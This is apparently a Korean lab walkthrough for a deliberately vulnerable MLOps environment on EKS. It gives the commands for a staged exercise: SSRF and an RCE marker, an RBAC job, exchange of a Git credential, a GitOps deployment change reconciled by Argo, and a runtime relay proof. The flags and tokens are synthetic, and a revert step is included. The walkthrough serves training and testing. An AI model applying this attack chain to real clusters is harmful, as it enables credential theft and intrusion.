# Stage 1~5 참가자 PoC: 공개 ModelGate 경로

이 문서는 기존 **runtime socket 프로필**의 재현 절차다. 현재 개인 EKS의
runtime-builder IAM/S3 프로필에서는 Stage 4~5에
[`PARTICIPANT_IAM_POC.md`](PARTICIPANT_IAM_POC.md)를 사용한다.

이 문서는 개인 EKS에서 검증한 **빠른 재현용 힌트 포함** 절차다. 운영자는 시작 전에
랩을 baseline으로 reset하고 참가자 IP가 허용 목록에 있는지 확인한다. 참가자 명령은
공개 ModelGate HTTP endpoint와 제한된 Git gateway만 사용하며 AWS profile, `kubectl`,
Pod exec는 사용하지 않는다. EIP와 proof 값은 다른 배포에서 달라질 수 있다.

검증 환경: Bash, `curl`, `git`, `base64`, Python 3.11 및 저장소의
`requirements/dev.txt`가 설치된 격리 Python 환경. Stage 1의 두 Python 파일은
공개 HTTP API만 사용하는 안전한 synthetic PoC다.

## 1. 공개 단서 → SSRF → RCE proof

브라우저에서 `http://3.35.2.114/docs`를 열고 `GET /api/system/info`와
webhook/artifact/model API를 살펴본다. system-info는 canary의 service, namespace,
port, path를 따로 반환한다.

```bash
export BASE=http://3.35.2.114
export PY=/tmp/vuln-mlops-poc-venv/bin/python

curl -fsS "$BASE/api/system/info" | "$PY" -m json.tool

POC_MODELGATE_URL="$BASE" POC_CANARY_TARGET=eks \
  "$PY" poc/ssrf_canary.py

RCE_JSON=$(POC_MODELGATE_URL="$BASE" \
  "$PY" poc/rce_marker.py --timeout 120)
printf '%s\n' "$RCE_JSON" | "$PY" -m json.tool

json_field() {
  "$PY" -c 'import json,sys; print(json.load(sys.stdin)[sys.argv[1]])' "$1"
}

FOOTHOLD=$(printf '%s' "$RCE_JSON" | json_field foothold_session)
API="$BASE/api/lab/footholds/$FOOTHOLD"
```

기대 증거: `MODELGATE_INTERNAL_SSRF_PROOF`, RCE validation `succeeded`,
`validator marker observed`, proof UUID와 `next` 경로.

## 2. Stage 2 RBAC → 고정 Job

`next`의 `/self-rules`에서 Job 권한을 확인한다. Job은 고정된 형태로만 제출된다.

```bash
curl -fsS "$API/self-rules" | "$PY" -m json.tool
curl -fsS -X POST "$API/stage-02/job" | "$PY" -m json.tool

for attempt in $(seq 1 60); do
  JOB_JSON=$(curl -fsS "$API/stage-02/job")
  if printf '%s' "$JOB_JSON" | "$PY" -c \
      'import json,sys; sys.exit(json.load(sys.stdin).get("succeeded", 0) < 1)'; then
    break
  fi
  sleep 2
done
printf '%s' "$JOB_JSON" | "$PY" -m json.tool

LOG_JSON=$(curl -fsS "$API/stage-02/log")
printf '%s' "$LOG_JSON" | "$PY" -m json.tool
printf '%s' "$LOG_JSON" | json_field encoded_proof | base64 -d
echo
```

기대 증거: Job `succeeded=1`, Stage 2 합성 Flag, log 응답의 Stage 3 `next`.

## 3. Stage 3 모니터링 → 제한된 Git credential

Datasource와 고정 topology query에서 `credential_ref`를 찾고 정확한 reference만
교환한다.

```bash
curl -fsS "$API/stage-03/datasources" | "$PY" -m json.tool
QUERY_JSON=$(curl -fsS "$API/stage-03/query")
printf '%s' "$QUERY_JSON" | "$PY" -m json.tool

REF=$(printf '%s' "$QUERY_JSON" | json_field credential_ref)
CREDS_JSON=$(curl -fsS "$API/stage-03/exchange/$REF")
printf '%s' "$CREDS_JSON" | "$PY" -m json.tool
```

기대 증거: Stage 3 합성 Flag, `stage4-lab` branch, `runtime-builder/` path,
`git_gateway` 및 `application_status` 경로. 응답의 Git credential은 실습용
synthetic 값이다.

## 4. 제한된 Git 변경 → Argo reconciliation

빠른 검증 힌트: Git repo의 기존 `runtime-builder/deployment.yaml`만 수정한다.
Pod template에 `lab.vuln-mlops/stage-04-proof`와
`lab.vuln-mlops/stage-05-ready` annotation을 넣고, 기존 모드 값과 relay enable
값만 변경한다. 아래의 Stage 4 proof 값은 **이 가이드가 제공하는 힌트**이므로
이 절차는 블라인드 단서 발견성 검사가 아니다. Image, node selector, socket,
volume, 권한은 변경하지 않는다.

```bash
GIT_USER=$(printf '%s' "$CREDS_JSON" | json_field username)
GIT_TOKEN=$(printf '%s' "$CREDS_JSON" | json_field token)
GATEWAY=$(printf '%s' "$CREDS_JSON" | json_field git_gateway)

GIT_URL=$("$PY" -c '
import sys
from urllib.parse import quote, urlsplit
base, user, token, path = sys.argv[1:]
parts = urlsplit(base)
print(parts.scheme + "://" + quote(user, safe="") + ":" +
      quote(token, safe="") + "@" + parts.netloc + path)
' "$BASE" "$GIT_USER" "$GIT_TOKEN" "$GATEWAY")

WORK=$(mktemp -d)
git clone --branch stage4-lab --single-branch "$GIT_URL" "$WORK/repo"
git -C "$WORK/repo" config user.name lab-participant
git -C "$WORK/repo" config user.email lab@example.invalid

"$PY" - "$WORK/repo/runtime-builder/deployment.yaml" <<'PY'
import sys
from pathlib import Path
import yaml

path = Path(sys.argv[1])
deployment = yaml.safe_load(path.read_text())
template = deployment["spec"]["template"]
annotations = template.setdefault("metadata", {}).setdefault("annotations", {})
annotations["lab.vuln-mlops/stage-04-proof"] = "FLAG{stage_4_gitops_placeholder}"
annotations["lab.vuln-mlops/stage-05-ready"] = "runtime-socket"

for item in template["spec"]["containers"][0]["env"]:
    if item["name"] == "STAGE4_MODE":
        item["value"] = "git-controlled"
    elif item["name"] == "STAGE5_MODE":
        item["value"] = "runtime-socket"
for item in template["spec"]["containers"][1]["env"]:
    if item["name"] == "RELAY_ENABLED":
        item["value"] = "true"

path.write_text(yaml.safe_dump(deployment, sort_keys=False))
PY

git -C "$WORK/repo" add runtime-builder/deployment.yaml
git -C "$WORK/repo" commit -m "exercise bounded runtime path"
git -C "$WORK/repo" push origin HEAD:stage4-lab
EXPECTED=$(git -C "$WORK/repo" rev-parse HEAD)
```

Argo가 동기화할 때까지 status API를 재조회한다. Push 직후에는 이전 revision의
`Synced/Healthy`가 잠시 보일 수 있다. **revision도 새 commit과 일치해야 한다.**

```bash
for attempt in $(seq 1 120); do
  STATUS_JSON=$(curl -fsS "$API/stage-04/application")
  if printf '%s' "$STATUS_JSON" | "$PY" -c '
import json, sys
status = json.load(sys.stdin)
expected = sys.argv[1]
sys.exit(not (status["sync"] == "Synced" and
              status["health"] == "Healthy" and
              status["revision"] == expected and
              status["runtime_relay"] is not None))
' "$EXPECTED"; then
    break
  fi
  sleep 5
done
printf '%s' "$STATUS_JSON" | "$PY" -m json.tool
```

기대 증거: 새 commit revision, `Synced/Healthy`, Stage 4 proof,
`stage5_mode=runtime-socket`, null이 아닌 `runtime_relay`.

## 5. 고정 runtime 작업 → 노드 전용 합성 proof

Stage 4 상태 응답의 실제 `runtime_relay` 경로를 사용한다. Null이면 요청을 보내지
않는다. Body, 명령, 이미지, 파일 경로는 입력하지 않는다.

```bash
RELAY_PATH=$(printf '%s' "$STATUS_JSON" | json_field runtime_relay)
test -n "$RELAY_PATH" && test "$RELAY_PATH" != "None" &&
  curl -fsS -X POST "$BASE$RELAY_PATH" | "$PY" -m json.tool
```

기대 증거: `proof=runtime`, `success=true`,
`FLAG{stage_5_node_placeholder}`. 이 응답은 합성 노드 proof이며 임의 노드
명령권이나 AWS IAM 접근의 증거가 아니다.

## 6. 참가자 Git 변경 복원

검증 후 방금 만든 Git commit을 되돌려 Argo가 baseline을 다시 배포하도록 한다.

```bash
git -C "$WORK/repo" revert --no-edit HEAD
git -C "$WORK/repo" push origin HEAD:stage4-lab
curl -fsS "$API/stage-04/application" | "$PY" -m json.tool
```

반환된 revision이 revert commit이고 `Synced/Healthy`, `runtime_relay=null`인지
재조회한다. 고정 Stage 2 Job과 proof state의 완전 초기화는 운영자 reset 절차다.

## 검증 범위

이 문서의 명령은 공개 participant path를 실제로 사용한다. 다만 Stage 1 payload
생성 스크립트와 Stage 4 proof 값·변경 필드 힌트를 제공하므로 완전한 블라인드
풀이 난도를 검증하지는 않는다. 팀원 블라인드 실습에서는 해당 힌트를 제외하고
`/docs`에서 시작해 발견 가능성을 별도로 확인한다.
